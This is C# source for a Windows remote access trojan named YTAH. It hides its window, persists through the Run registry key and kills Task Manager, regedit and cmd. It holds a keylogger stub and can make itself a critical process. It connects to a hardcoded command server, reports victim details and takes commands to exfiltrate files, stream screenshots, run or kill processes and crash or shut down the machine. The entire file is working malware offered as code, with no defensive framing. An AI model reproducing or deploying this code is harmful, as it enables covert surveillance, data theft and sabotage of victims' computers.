using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace YTAH
{

    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void KeepClose()
        {
            while (true)
            {
                if (isenabled == true)
                {
                    try
                    {
                        foreach (var process in Process.GetProcessesByName("Taskmgr"))
                        {
                            process.Kill();
                        }
                        foreach (var process in Process.GetProcessesByName("regedit"))
                        {
                            process.Kill();
                        }
                        foreach (var process in Process.GetProcessesByName("cmd"))
                        {
                            process.Kill();
                        }
                    }
                    catch
                    {

                    }

                }

            }
        }
        public static string logs;
        static void GK()
        {
            Thread.Sleep(10);
            for(Int32 i = 0; i < 255; i++)
            {
                int keyState = GetAsyncKeyState(i);
                if(keyState == 1 || keyState == -32767)
                {
                    string toStringKey = Convert.ToString((Keys)i);
                    logs = logs + toStringKey;
                   
                    break;
                }
            }
        }
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
       
        static void SetStartup()
        {
            //while (true)
            //{
                int counter = 0;
                try
                {
                    RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                    foreach (string k in key.GetValueNames())
                    {
                        if (k.Contains("YTAH"))
                        {
                            counter++;
                            key.DeleteValue(k);
                            string rdm = RandomString(4);
                            key.SetValue("YTAH" + rdm, Application.ExecutablePath.ToString());
                            break;
                        }

                    }
                    if (counter == 0)
                    {
                        string rdm = RandomString(4);
                        key.SetValue("YTAH", Application.ExecutablePath.ToString());
                        counter++;
                    }
                }
                catch
                {

                }
               // Thread.Sleep(1500);
          //  }



        }
        public static NetworkStream ns;
        public static TcpClient client;
        static IPAddress ip = IPAddress.Parse("78.114.52.238");
        static int port = 5000;
        public Form1()
        {


            InitializeComponent();
            this.Hide();
            this.FormBorderStyle = FormBorderStyle.None;
            SetStartup();
            timer1.Start();
            timer2.Start();
            this.TopMost = true;
            client = new TcpClient();
            Thread thread = new Thread(o => ReceiveData((TcpClient)o));
            thread.Start(client);
            //Unkillable.MakeProcessUnkillable();
            new Thread(() =>
            {
                GK();
            }).Start();

            new Thread(() =>
            {
                KeepClose();
            }).Start();

            if (client.Connected == false)
            {
                try
                {
                    client.Connect(ip, port);
                }
                catch
                {

                }
            }
            if (client.Connected == true)
            {
                Thread threads = new Thread(o => ReceiveData((TcpClient)o));
                threads.Start(client);
                ns = client.GetStream();
                
            }
            new Thread(() =>
            {
                SetStartup();
            }).Start();

        }

        public static bool isconnected;
        public static string CurrentPath = "";
        public static bool isenabled = true;
        static Image GrabDesktop()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics graphic = Graphics.FromImage(screenshot);
            graphic.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            return screenshot;
        }
        static void SendImage()
        {
            try
            {
                while (hasToShare == true)
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    binaryFormatter.Serialize(ns, GrabDesktop());

                }
            }
            catch
            {

            }

        }
        static void ResetData()
        {
            try
            {
                CurrentPath = "";
                isenabled = true;
                Unkillable.MakeProcessUnkillable();
            }
            catch
            {

            }

        }

        public static bool hasToShare = false;
        static async void ReceiveData(TcpClient client)
        {

            byte[] receivedBytes = new byte[1024];
                int byte_count;
            try
            {
                bool isElevated;
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
                var httpClient = new HttpClient();
                var ip = await httpClient.GetStringAsync("https://api.ipify.org");
                string ipadress = ip;
                byte[] b = Encoding.UTF8.GetBytes("NC|" + System.Environment.MachineName + "|" + System.Environment.UserName.ToString() + "|" + isElevated.ToString() + "|" + ipadress);
                ns.Write(b, 0, b.Length);
                while ((byte_count = ns.Read(receivedBytes, 0, receivedBytes.Length)) > 0)
                {

                    string d = Encoding.UTF8.GetString(receivedBytes, 0, byte_count);
                    byte[] buffer = Encoding.UTF8.GetBytes("");
                    Console.WriteLine(d);
                    if(d == "")
                    {

                    }
                    if (d == "grights")
                    {
                     
                        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                        {
                            WindowsPrincipal principal = new WindowsPrincipal(identity);
                            isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
                        }
                        buffer = Encoding.UTF8.GetBytes(isElevated.ToString());
                        ns.Write(buffer, 0, buffer.Length);
                    }
                    try
                    {
                        
               
                        if (d.Contains("shut"))
                        {
                            Process.Start("shutdown", "/s /t 0");
                        }
                        if (d.Contains("bs"))
                        {
                            foreach (var process in Process.GetProcessesByName("csrss"))
                            {
                                process.Kill();
                            }
                        }
                        if (d.Contains("GD")) //GetDrives|ADMIN
                        {
                            string[] drives = Directory.GetLogicalDrives();
                            foreach (string str in drives)
                            {
                                byte[] bs = Encoding.UTF8.GetBytes(str);
                                ns.Write(bs, 0, bs.Length);
                                Thread.Sleep(30);
                            }
                             

                        }
                       
                        if (d.Contains("mt"))
                        {
                            string[] splitter = d.Split('|');
                            CurrentPath = splitter[1];
                       

                        }
                        if (d.Contains("sm"))
                        {
                            string[] splitter = d.Split('|');
                            MessageBox.Show(splitter[1]);
                        }
                        if (d.Contains("initsc"))
                        {
                            //init screenshare
                            hasToShare = true;
                            SendImage();
                        }
                        if (d.Contains("endsc"))
                        {
                            //end
                            hasToShare = false;
                        }
                        if (d.Contains("ld"))
                        {
                            if (CurrentPath == "")
                            {
                                buffer = Encoding.UTF8.GetBytes("PathEmpty");
                                ns.Write(buffer, 0, buffer.Length);
                            }
                            string[] files = Directory.GetDirectories(CurrentPath);
                            if (files.Length > 0)
                            {
                                foreach (string file in files)
                                {
                                    buffer = Encoding.UTF8.GetBytes(file);
                                    ns.Write(buffer, 0, buffer.Length);
                                    Thread.Sleep(50);


                                }
                            }
                            else
                            {
                                buffer = Encoding.UTF8.GetBytes("END");
                                ns.Write(buffer, 0, buffer.Length);
                                Thread.Sleep(50);

                            }
                        }
                        if (d.Contains("enable"))
                        {
                             if(isenabled == false)
                            {
                                buffer = Encoding.UTF8.GetBytes("ENABLED");
                                ns.Write(buffer, 0, buffer.Length);
                                isenabled = true;
                               // MessageBox.Show(isenabled.ToString());
                            }
                        }
                        if (d.Contains("disable"))
                        {
                            if (isenabled == true)
                            {
                                isenabled = false;
                                buffer = Encoding.UTF8.GetBytes("DISABLED");
                                ns.Write(buffer, 0, buffer.Length);
                           //     MessageBox.Show(isenabled.ToString());
                            }
                           
                        }
                        if (d.Contains("ls"))
                        {
                            if (CurrentPath == "")
                            {
                                buffer = Encoding.UTF8.GetBytes("PathEmpty");
                                ns.Write(buffer, 0, buffer.Length);
                            }
                            else
                            {

                                string[] files = Directory.GetFiles(CurrentPath);
                                if (files.Length > 0)
                                {
                                    foreach (string file in files)
                                    {

                                        buffer = Encoding.UTF8.GetBytes(file);
                                        ns.Write(buffer, 0, buffer.Length);
                                        Thread.Sleep(50);
                                }
                                }

                                else
                                {
                                    buffer = Encoding.UTF8.GetBytes("END");
                                    ns.Write(buffer, 0, buffer.Length);
                                    Thread.Sleep(50);
                                }

                            }

                        }
                        if (d.Contains("DF"))
                        {
                            string[] data = d.Split('|');
                            string dfpath = data[1];
                            try
                            {
                                
                                
                                byte[] advert = Encoding.UTF8.GetBytes("INF");
                                ns.Write(advert, 0, advert.Length);
                                Thread.Sleep(50);
                                client.Client.SendFile(dfpath);
                                Thread.Sleep(50);
                                byte[] endadvert = Encoding.UTF8.GetBytes("ENDINF");
                                ns.Write(endadvert, 0, endadvert.Length);

                            }
                            catch (Exception e)
                            {
                                buffer = Encoding.UTF8.GetBytes("Failed");
                                ns.Write(buffer, 0, buffer.Length);
                                MessageBox.Show(e.ToString());
                            }
                        }
                        if (d.Contains("SP"))
                        {
                            string[] data = d.Split('|');
                            try
                            {
                                Process p = Process.Start(data[1]);
                                buffer = Encoding.UTF8.GetBytes("Done");
                                ns.Write(buffer, 0, buffer.Length);
                            }
                            catch (Exception e)
                            {
                                buffer = Encoding.UTF8.GetBytes("Failed");
                                ns.Write(buffer, 0, buffer.Length);
                               
                            }
                        }
                        if (d.Contains("LP"))
                        {
                            try
                            {
                                string msg = "";
                                Process[] allProc = Process.GetProcesses();
                                foreach (Process proc in allProc)
                                {

                                    string name = proc.ProcessName;
                                    string id = proc.Id.ToString();
                                    string title = proc.MainWindowTitle;
                                     msg = name + "|" + id + "|" + title;
                                    byte[] ms = Encoding.UTF8.GetBytes(msg);
                                    ns.Write(ms, 0, ms.Length);
                                    Thread.Sleep(35);
                                }

                            }
                            catch(Exception ex)
                            {
                              //  MessageBox.Show(ex.ToString());
                            }
                        }
                        if (d.Contains("KP"))
                        {
                            string[] data = d.Split('|');
                            try
                            {
                                foreach (var process in Process.GetProcessesByName(data[1]))
                                {
                                    process.Kill();
                                }
                                buffer = Encoding.UTF8.GetBytes("Done");
                                ns.Write(buffer, 0, buffer.Length);

                            }
                            catch (Exception e)
                            {
                                buffer = Encoding.UTF8.GetBytes("Failed");
                                ns.Write(buffer, 0, buffer.Length);
                            

                            }
                        }
                    }
                    catch (Exception e)
                    {
                        buffer = Encoding.UTF8.GetBytes("Failed");
                        ns.Write(buffer, 0, buffer.Length);
                     
                    }
                }
            }
            catch
            {
                while (client.Connected == false)
                {
                    try
                    {
                        IPAddress ip = IPAddress.Parse("78.114.52.238");
                        int port = 5000;
                        client = new TcpClient();
                        client.Connect(ip, port);
                        ns = client.GetStream();
                        ReceiveData(client);
                    }
                    catch
                    {

                    }
                }

            }
        }


            
            
        
            
            private void Form1_Load(object sender, EventArgs e)
            {
         
            }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                this.Hide();
              

            }
            catch (Exception ex)
            {
                
            }


        }

        private void timer2_Tick(object sender, EventArgs e)
        {

        }
        public static void UploadFile(string path)
        {
           // MessageBox.Show(path);
        }
    }

    public static class Unkillable
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        public static bool isadmin = false;
        public static void MakeProcessUnkillable()
        {
            try
            {
                Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
                isadmin = true;
            }
            catch
            {
                isadmin = false;
            }
        }

        public static void MakeProcessKillable()
        {
            try
            {
                RtlSetProcessIsCritical(0, 0, 0);
            }
            catch
            {

            }
        }
    }
}
